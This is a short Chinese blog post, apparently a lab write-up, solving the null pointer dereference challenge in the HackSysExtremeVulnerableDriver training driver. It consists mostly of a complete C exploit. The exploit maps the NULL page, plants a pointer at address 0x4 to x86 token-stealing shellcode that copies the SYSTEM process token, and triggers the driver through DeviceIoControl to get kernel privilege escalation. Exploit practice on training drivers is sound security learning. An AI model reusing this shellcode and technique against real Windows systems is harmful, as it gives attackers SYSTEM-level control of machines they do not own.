<small>转载请注明出处哦 :  )</small>

不是，讲道理有上一篇的铺垫这次利用也太简单了吧。

看到 NullPointerDereference.c 文件，我们的输入若不等于 MagicValue 的话 NullPointerDereference 又变为 NULL 指针，而后面不检查 NullPointerDereference 是否为 NULL 指针直接调用 NullPointerDereference->Callback()

看到这里利用方法不就是上一篇中的一环吗？若有不清楚的朋友可以先做一下池溢出，这里就什么都不解释直接贴 exp 了。

```c
// nullpointerDereference.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#include <windows.h>
#include <Memoryapi.h>

typedef NTSTATUS(WINAPI * NtAllocateVirtualMemory_t) (HANDLE    ProcessHandle,
	PVOID     *BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T   RegionSize,
	ULONG     AllocationType,
	ULONG     Protect);

char shellcode[] = {

	"\x90\x90\x90\x90"              // NOP Sled
	"\x60"                          // pushad
	"\x31\xc0"                      // xor eax,eax
	"\x64\x8b\x80\x24\x01\x00\x00"  // mov eax,[fs:eax+0x124]
	"\x8b\x40\x50"                  // mov eax,[eax+0x50]
	"\x89\xc1"                      // mov ecx,eax
	"\xba\x04\x00\x00\x00"          // mov edx,0x4
	"\x8b\x80\xb8\x00\x00\x00"      // mov eax,[eax+0xb8]
	"\x2d\xb8\x00\x00\x00"          // sub eax,0xb8
	"\x39\x90\xb4\x00\x00\x00"      // cmp [eax+0xb4],edx
	"\x75\xed"                      // jnz 0x1a
	"\x8b\x90\xf8\x00\x00\x00"      // mov edx,[eax+0xf8]
	"\x89\x91\xf8\x00\x00\x00"      // mov [ecx+0xf8],edx
	"\x61"                          // popad

	"\xC3"                          // ret
									//"\xC2\x10\x00"                  // ret 16
};


int main()
{
	LPVOID ptr = VirtualAlloc(0, sizeof(shellcode), 0x3000, 0x40);
	RtlCopyMemory(ptr, shellcode, sizeof(shellcode));

	HMODULE hmodule = LoadLibraryA("ntdll.dll");

	NtAllocateVirtualMemory_t NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hmodule, "NtAllocateVirtualMemory");

	if (NtAllocateVirtualMemory == NULL) {
		printf("getprocaddress failed\n");
		return 0;
	}

	PVOID baseAddress = (PVOID)1;
	ULONG regionsize = 0x100;
	NTSTATUS status = NtAllocateVirtualMemory((HANDLE)0xFFFFFFFF, &baseAddress, 0, &regionsize, 0x3000, 0x40);

	if (status != 0) {
		printf("alloc failed,error code is:%u\n", status);
		return 0;
	}
	if (!WriteProcessMemory((HANDLE)0xFFFFFFFF, (LPVOID)0x04, &ptr, 0x4, NULL)) {
		printf("write failed\n");
		return 0;
	}

	int value = 0x1;
	int *payload = &value;

	HANDLE hevDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, NULL, 0x3, 0, NULL);
	DWORD lpBytesReturned = 0;
	DeviceIoControl(hevDevice, 0x22202b, payload, 0x4, NULL, 0, &lpBytesReturned, NULL);

	system("whoami");

    return 0;
}

```

： )

---

<p align='right'>2019.9.4</p>